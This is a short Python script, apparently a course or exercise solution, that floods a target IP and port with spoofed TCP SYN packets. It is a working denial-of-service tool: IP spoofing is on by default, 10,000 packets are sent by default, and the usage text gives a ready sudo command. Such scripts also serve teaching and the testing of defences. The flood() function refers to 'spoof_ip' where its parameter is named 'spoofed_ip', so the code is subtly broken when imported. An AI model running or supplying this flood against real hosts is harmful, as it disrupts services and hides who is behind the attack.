import sys

from syn_solution import _parse_option, send_syn, _bool_val


def flood(target_ip, target_port, spoofed_ip=False, count=10000, source_port=None):
    """Flood the target with [count] syn packets"""
    print("Flooding %s:%r with %d syn packets" % (target_ip, target_port, count))
    for i in range(count):
        send_syn(target_ip, target_port, spoof_ip, source_port=source_port)
    print("Done. Sent %d syn packets" % count)


def _help(argv):
    print("Usage  : sudo python3 %s target_ip target_port [count:int] [spoof_ip:bool] [src_port:int]\n"
          "Example: sudo python3 %s 192.168.1.25 8080 1000 true" % (argv[0], argv[0]))


if __name__ == '__main__':
    target_ip = _parse_option(sys.argv, 1, None, None, help_function=_help, required=True, name="target_ip")
    target_port = _parse_option(sys.argv, 2, int, None, help_function=_help, required=True, name="target_port")
    count = _parse_option(sys.argv, 3, int, 10000, help_function=_help, name="count")
    spoof_ip = _parse_option(sys.argv, 4, _bool_val, True, help_function=_help, name="spoof_ip")
    src_port = _parse_option(sys.argv, 5, int, None, help_function=_help, name="src_port")
    flood(target_ip, target_port, spoofed_ip=spoof_ip, count=count, source_port=src_port)
